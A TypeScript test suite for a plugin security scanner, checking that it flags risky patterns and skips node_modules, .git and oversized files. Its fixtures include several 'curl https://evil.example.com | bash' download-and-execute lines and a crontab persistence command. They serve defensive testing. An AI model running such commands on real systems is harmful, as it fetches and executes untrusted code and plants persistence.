import { afterEach, describe, expect, test } from "bun:test";
import * as fs from "node:fs/promises";
import * as os from "node:os";
import * as path from "node:path";

import { scanPluginDir, toDoctorChecks } from "../src/extensibility/plugins/security-scanner";

// ─── Helpers ──────────────────────────────────────────────────────────────────

const tmpRoots: string[] = [];

async function makeTmpDir(): Promise<string> {
	const dir = await fs.mkdtemp(path.join(os.tmpdir(), "plugin-sec-scan-"));
	tmpRoots.push(dir);
	return dir;
}

async function writeFile(dir: string, relPath: string, content: string): Promise<void> {
	const full = path.join(dir, relPath);
	await fs.mkdir(path.dirname(full), { recursive: true });
	await fs.writeFile(full, content, "utf-8");
}

afterEach(async () => {
	for (const root of tmpRoots.splice(0)) {
		await fs.rm(root, { recursive: true, force: true });
	}
});

// ─── Tests ────────────────────────────────────────────────────────────────────

describe("scanPluginDir", () => {
	test("clean directory returns riskLevel=none", async () => {
		const dir = await makeTmpDir();
		await writeFile(dir, "index.ts", "export function hello() { return 'world'; }");

		const report = await scanPluginDir(dir);

		expect(report.riskLevel).toBe("none");
		expect(report.findings.length).toBe(0);
		expect(report.score).toBe(100);
	});

	test("curl pipe to bash is detected as high risk with correct file and line", async () => {
		const dir = await makeTmpDir();
		const content = ["#!/bin/sh", "# setup script", "curl https://evil.example.com/payload | bash"].join("\n");
		await writeFile(dir, "setup.sh", content);

		const report = await scanPluginDir(dir);

		expect(report.riskLevel).toBe("high");

		const finding = report.findings.find(f => f.id === "download_exec");
		expect(finding).toBeDefined();
		expect(finding!.file).toBe("setup.sh");
		expect(finding!.line).toBe(3);
	});

	test("eval() triggers dynamic_exec finding", async () => {
		const dir = await makeTmpDir();
		await writeFile(dir, "plugin.js", "const result = eval(userInput);");

		const report = await scanPluginDir(dir);

		const finding = report.findings.find(f => f.id === "dynamic_exec");
		expect(finding).toBeDefined();
		expect(finding!.file).toBe("plugin.js");
		expect(finding!.line).toBe(1);
	});

	test(".env file is detected as sensitive credential finding", async () => {
		const dir = await makeTmpDir();
		await writeFile(dir, ".env", "API_SECRET=supersecret");

		const report = await scanPluginDir(dir);

		const finding = report.findings.find(f => f.id === "sensitive_file");
		expect(finding).toBeDefined();
		expect(finding!.category).toBe("credential");
	});

	test("cron/persistence pattern is detected as high risk", async () => {
		const dir = await makeTmpDir();
		await writeFile(
			dir,
			"installer.sh",
			"#!/bin/sh\ncrontab -l | { cat; echo '0 * * * * /usr/bin/evil'; } | crontab -",
		);

		const report = await scanPluginDir(dir);

		expect(report.riskLevel).toBe("high");
		const finding = report.findings.find(f => f.id === "persistence");
		expect(finding).toBeDefined();
	});

	test("npm install invocation is detected as package_install", async () => {
		const dir = await makeTmpDir();
		await writeFile(dir, "README.md", "Run `npm install lodash` to set up dependencies.");

		const report = await scanPluginDir(dir);

		const finding = report.findings.find(f => f.id === "npm_install");
		expect(finding).toBeDefined();
		expect(finding!.category).toBe("package_install");
	});

	test("node_modules directory is skipped", async () => {
		const dir = await makeTmpDir();
		// This file inside node_modules must NOT trigger findings
		await writeFile(dir, "node_modules/evil/index.js", "curl https://evil.example.com | bash");
		// Clean file at top level
		await writeFile(dir, "index.ts", "export const x = 1;");

		const report = await scanPluginDir(dir);

		expect(report.riskLevel).toBe("none");
	});

	test("never throws on binary / unreadable file", async () => {
		const dir = await makeTmpDir();
		// Write a file that appears to be a text extension but has binary content
		await fs.writeFile(path.join(dir, "binary.ts"), Buffer.from([0x00, 0xff, 0xfe, 0x80, 0x00]));

		// Should not throw
		const report = await scanPluginDir(dir);
		expect(report).toBeDefined();
	});

	test("never throws on non-existent directory", async () => {
		const report = await scanPluginDir("/tmp/__definitely_does_not_exist_xyzzy__");
		expect(report.riskLevel).toBe("none");
		expect(report.findings).toHaveLength(0);
	});

	test("score is 100 with no findings", async () => {
		const dir = await makeTmpDir();
		await writeFile(dir, "lib.ts", "export function add(a: number, b: number) { return a + b; }");

		const report = await scanPluginDir(dir);
		expect(report.score).toBe(100);
	});

	test("score is reduced for high-severity findings", async () => {
		const dir = await makeTmpDir();
		await writeFile(dir, "run.sh", "curl https://evil.example.com | bash");

		const report = await scanPluginDir(dir);
		expect(report.score).toBeLessThan(100);
	});

	test("a package-install-only finding surfaces as low risk (never silently none)", async () => {
		const dir = await makeTmpDir();
		await writeFile(dir, "README.md", "Setup: run `npm install left-pad` and you are done.");

		const report = await scanPluginDir(dir);
		// A single -5 package_install finding scores 95; it must still floor to "low",
		// not fall through to "none" (which would suppress the supply-chain advisory).
		expect(report.riskLevel).toBe("low");
		expect(report.findings.some(f => f.id === "npm_install")).toBe(true);
	});

	test(".git directory contents are skipped", async () => {
		const dir = await makeTmpDir();
		await writeFile(dir, ".git/hooks/pre-commit", "curl https://evil.example.com | bash");
		await writeFile(dir, "index.ts", "export const x = 1;");

		const report = await scanPluginDir(dir);
		expect(report.riskLevel).toBe("none");
	});

	test("files larger than the size cap are skipped", async () => {
		const dir = await makeTmpDir();
		// 3MB file (> 2MB cap); the only risky token is at the very top.
		await writeFile(dir, "huge.js", `curl https://evil.example.com | bash\n${"a".repeat(3_000_000)}`);

		const report = await scanPluginDir(dir);
		expect(report.findings.find(f => f.id === "download_exec")).toBeUndefined();
	});

	test("never throws on an unreadable file (permission denied)", async () => {
		const dir = await makeTmpDir();
		const target = path.join(dir, "locked.ts");
		await fs.writeFile(target, "const x = 1;", "utf-8");
		await fs.chmod(target, 0o000).catch(() => {});

		// Must not throw regardless of whether the runner can read it.
		const report = await scanPluginDir(dir);
		expect(report).toBeDefined();
		await fs.chmod(target, 0o644).catch(() => {}); // restore so afterEach cleanup can remove it
	});
});

describe("toDoctorChecks", () => {
	test("returns empty array when riskLevel is none", async () => {
		const dir = await makeTmpDir();
		await writeFile(dir, "index.ts", "export const safe = true;");

		const report = await scanPluginDir(dir);
		const checks = toDoctorChecks("my-plugin", report);

		expect(checks).toHaveLength(0);
	});

	test("returns a single warning check for risky plugin", async () => {
		const dir = await makeTmpDir();
		await writeFile(dir, "setup.sh", "curl https://evil.example.com | bash");

		const report = await scanPluginDir(dir);
		const checks = toDoctorChecks("my-plugin", report);

		expect(checks.length).toBeGreaterThanOrEqual(1);
		const check = checks[0];
		expect(check.name).toBe("plugin:my-plugin:security");
		expect(check.status).toBe("warning"); // NEVER "error"
		expect(check.message).toContain("risk=");
	});

	test("never emits status error", async () => {
		const dir = await makeTmpDir();
		await writeFile(dir, "a.sh", "curl https://evil.example.com | bash\ncrontab -l");

		const report = await scanPluginDir(dir);
		const checks = toDoctorChecks("evil-plugin", report);

		for (const check of checks) {
			expect(check.status).not.toBe("error");
		}
	});
});
